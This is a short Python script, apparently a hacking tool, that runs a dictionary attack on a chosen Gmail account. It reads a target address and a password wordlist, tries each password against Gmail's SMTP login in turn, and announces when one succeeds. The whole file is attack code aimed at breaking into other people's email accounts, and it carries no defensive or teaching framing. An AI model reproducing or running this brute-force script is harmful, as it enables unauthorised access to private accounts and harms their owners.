
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter The Target Gmail Address => ")

print("\n")

passswfile= input('Enter password wordlist =>')

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[!] Password Found = %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print(":-( Password Is Wrong = %s " % password)
